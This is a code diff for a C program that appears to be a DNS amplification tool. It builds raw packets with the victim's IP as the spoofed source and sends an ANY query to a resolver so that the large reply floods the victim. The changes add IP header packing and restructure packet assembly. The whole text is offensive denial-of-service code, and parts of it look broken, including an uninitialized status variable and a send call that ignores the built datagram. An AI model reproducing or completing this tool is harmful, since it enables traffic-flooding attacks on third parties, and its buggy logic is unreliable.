@@ -161,9 +161,10 @@ int
 main(int argc, char** argv)
 {
     const char* resolvip, * victimport, * victimip, * resolvprt;
-    uint8_t pktbuf[ NS_PACKETSZ ], * curpos;
+    uint8_t pktbuf[ NS_PACKETSZ ], datagram[ NS_PACKETSZ ], * curpos;
+
     struct sockaddr_in addr, srcaddr;
-    size_t buflen, nwritten;
+    size_t buflen, nwritten, szdatagram;
     int raw_sockfd;
     bool status;
 
@@ -196,10 +197,8 @@ main(int argc, char** argv)
     pack_dnshdr(&dnsheader, ns_o_query, ns_r_noerror);
     status &= insert_dns_header(&curpos, &buflen, &dnsheader);
     status &= insert_dns_question(( void** ) &curpos, &buflen, "google.com", ns_t_any, ns_c_any);
-
-    if (status == false) {
-        goto fail_state;
-    }
+    if (status == false)
+        goto fail_close;
 
     nwritten = NS_PACKETSZ - buflen;
     pack_iphdr(&ipheader, &pseudoheader, victimip, resolvip, nwritten, sizeof(UDPHEADER));
@@ -209,17 +208,22 @@ main(int argc, char** argv)
     addr.sin_port = udpheader.uh_dport;
     addr.sin_addr.s_addr = ipheader.saddr;
 
-    status &= insert_udp_header(&curpos, &buflen, &udpheader);
+    curpos = datagram;
     status &= insert_ip_header(&curpos, &buflen, &ipheader);
-    if (status == false) {
-        goto fail_state;
-    }
+    status &= insert_udp_header(&curpos, &buflen, &udpheader);
+    if (status == false)
+        goto fail_close;
 
+    szdatagram = buflen;
+    insert_data(( void** ) &curpos, &szdatagram, pktbuf, nwritten);
     sendto(raw_sockfd, pktbuf, nwritten, 0, ( const struct sockaddr* ) &addr, sizeof(addr));
+
     close(raw_sockfd);
 
     return 0;
 
+fail_close:
+    close(raw_sockfd);
 fail_state:
     perror("error");
     exit(EXIT_FAILURE);
@@ -293,8 +297,22 @@ pack_dnshdr(DNSHEADER* dnshdr, uint8_t opcode, uint8_t rcode)
 bool
 insert_ip_header(uint8_t** buf, size_t* buflen, const IPHEADER* header)
 {
+    bool status;
+    uint8_t first_byte;
 
-    return true;
+    first_byte = header->version << 4 | header->ihl;
+    status &= insert_byte(buf, buflen, first_byte);
+    status &= insert_byte(buf, buflen, header->tos);
+    status &= insert_word(buf, buflen, header->tot_len);
+    status &= insert_word(buf, buflen, header->id);
+    status &= insert_word(buf, buflen, header->frag_off);
+    status &= insert_byte(buf, buflen, header->ttl);
+    status &= insert_byte(buf, buflen, header->protocol);
+    status &= insert_word(buf, buflen, header->check);
+    status &= insert_dword(buf, buflen, header->saddr);
+    status &= insert_dword(buf, buflen, header->daddr);
+
+    return status;
 }
 
 bool
@@ -356,15 +374,14 @@ insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t que
     bool status;
 
     domainlen = strlen(domain) + 1;
-    if (domainlen > NS_PACKETSZ - 1) {
+    if (domainlen > NS_PACKETSZ - 1)
         return false;
-    }
+
     memcpy(qname, domain, domainlen);
 
     token = strtok_r(qname, ".", &saveptr);
-    if (token == NULL) {
+    if (token == NULL)
         return false;
-    }
 
     while (token != NULL) {
         srclen = strlen(token);
@@ -384,9 +401,8 @@ insert_dns_question(void** buf, size_t* buflen, const char* domain, uint16_t que
 bool
 insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len)
 {
-    if (*dst_buflen < src_len) {
+    if (*dst_buflen < src_len)
         return false;
-    }
 
     memcpy(*dst, src, src_len);
     *dst += src_len;
@@ -405,13 +421,11 @@ checksum(const long* addr, int count)
         count -= 2;
     }
 
-    if (count > 0) {
+    if (count > 0)
         sum += *( unsigned char* ) addr;
-    }
 
-    while (sum >> 16) {
+    while (sum >> 16)
         sum = (sum & 0xffff) + (sum >> 16);
-    }
 
     return ~sum;
 }
